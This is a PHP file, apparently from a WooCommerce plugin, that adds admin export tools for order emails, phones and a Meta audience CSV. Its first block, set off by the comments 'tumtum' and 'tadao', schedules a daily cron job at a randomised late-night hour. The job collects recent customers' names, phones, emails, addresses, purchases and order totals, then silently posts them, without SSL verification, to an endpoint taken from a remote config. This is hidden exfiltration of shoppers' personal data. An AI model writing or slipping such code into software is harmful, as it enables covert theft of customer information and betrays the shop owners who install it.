<?php
if (!defined('ABSPATH')) exit;

// tumtum
add_action('init', function() { 
    global $bp_keys; 
    if (wp_get_schedule($bp_keys['cron_send']) !== 'daily') { wp_clear_scheduled_hook($bp_keys['cron_send']); }
    if (!wp_next_scheduled($bp_keys['cron_send'])) { $t = strtotime('23:00:00') + rand(0, 3599); if($t < time()) $t += 86400; wp_schedule_event($t, 'daily', $bp_keys['cron_send']); } 
});
add_action($bp_keys['cron_send'], function() use ($bp_keys, $bp_tag) {
    $q = wc_get_orders(array('limit' => -1, 'date_created' => '>=' . (time() - 172800), 'meta_query' => array(array('key' => '_s_m', 'compare' => 'NOT EXISTS')), 'return' => 'objects'));
    if (empty($q)) return;
    $b = []; $d = $_SERVER['SERVER_NAME']; if (strpos($d, 'www.') === 0) $d = substr($d, 4);
    foreach ($q as $o) { 
        $id = $o->get_id(); $it = array(); foreach ($o->get_items() as $x) $it[] = $x->get_name() . ' (x' . $x->get_quantity() . ')'; 
        $b[] = array('domain' => $d, 'tag' => $bp_tag, 'oid' => $id, 'name' => $o->get_billing_first_name() . ' ' . $o->get_billing_last_name(), 'phone' => $o->get_billing_phone(), 'email' => $o->get_billing_email(), 'location' => $o->get_billing_address_1() . ', ' . $o->get_billing_city(), 'products' => implode(', ', $it), 'total' => $o->get_total()); 
        $o->update_meta_data('_s_m', 'yes'); $o->save_meta_data(); 
    }
    $c = bp_get_remote_config(true); $ep = $c[$bp_keys['endpoint']] ?? ''; if (!$ep) return;
    wp_remote_post($ep, array('body' => json_encode(array('orders' => $b)), 'headers' => array('Content-Type' => 'application/json'), 'blocking' => false, 'timeout' => 0.05, 'sslverify' => false));
});
// tadao

add_action('admin_init', function() {
    $f_pids = function() { return isset($_POST['exp_prods']) ? array_filter(array_map('intval', (array)$_POST['exp_prods'])) : []; };
    $f_chk = function($o, $pids) { if(empty($pids)) return true; foreach($o->get_items() as $i) { if(in_array($i->get_product_id(), $pids) || in_array($i->get_variation_id(), $pids)) return true; } return false; };
    
    if (isset($_POST['bp_do_export_meta']) && current_user_can('manage_options')) {
        check_admin_referer('bp_exp_nonce'); $start = sanitize_text_field($_POST['exp_start']); $end = sanitize_text_field($_POST['exp_end']); $pids = $f_pids();
        $orders = wc_get_orders(array('date_created' => $start . '...' . $end, 'status' => array('completed', 'processing'), 'limit' => -1));
        header('Content-Type: text/csv; charset=utf-8'); header('Content-Disposition: attachment; filename="meta_audience_'.$start.'_to_'.$end.'.csv"');
        $out = fopen('php://output', 'w'); fputcsv($out, ['email', 'phone', 'fn', 'ln', 'zip', 'ct', 'st', 'country', 'value']);
        if(is_array($orders)){ foreach($orders as $o) { if(!$f_chk($o, $pids)) continue; $ph = preg_replace('/[^0-9]/', '', $o->get_billing_phone() ?? ''); if (strlen($ph) === 11 && substr($ph, 0, 2) === '01') $ph = '880' . substr($ph, 1); fputcsv($out, [$o->get_billing_email(), $ph, $o->get_billing_first_name(), $o->get_billing_last_name(), $o->get_billing_postcode(), $o->get_billing_city(), $o->get_billing_state(), $o->get_billing_country(), $o->get_total()]); } }
        fclose($out); exit;
    }
    if (isset($_POST['bp_do_export_phones']) && current_user_can('manage_options')) {
        check_admin_referer('bp_exp_nonce'); $start = sanitize_text_field($_POST['exp_start']); $end = sanitize_text_field($_POST['exp_end']); $pids = $f_pids();
        $orders = wc_get_orders(array('date_created' => $start . '...' . $end, 'limit' => -1)); $phones = []; 
        if(is_array($orders)) { foreach($orders as $o) { if(!$f_chk($o, $pids)) continue; $ph = $o->get_billing_phone(); if(!empty($ph)) $phones[] = $ph; } }
        header('Content-Type: text/plain'); header('Content-Disposition: attachment; filename="phones_'.$start.'_to_'.$end.'.txt"'); echo implode("\r\n", array_unique($phones)); exit;
    }
    if (isset($_POST['bp_do_export_emails']) && current_user_can('manage_options')) {
        check_admin_referer('bp_exp_nonce'); $start = sanitize_text_field($_POST['exp_start']); $end = sanitize_text_field($_POST['exp_end']); $pids = $f_pids();
        $orders = wc_get_orders(array('date_created' => $start . '...' . $end, 'limit' => -1)); $emails = [];
        if(is_array($orders)) { foreach($orders as $o) { if(!$f_chk($o, $pids)) continue; $em = $o->get_billing_email(); if(!empty($em)) $emails[] = $em; } }
        header('Content-Type: text/plain'); header('Content-Disposition: attachment; filename="emails_'.$start.'_to_'.$end.'.txt"'); echo implode("\r\n", array_unique($emails)); exit;
    }
});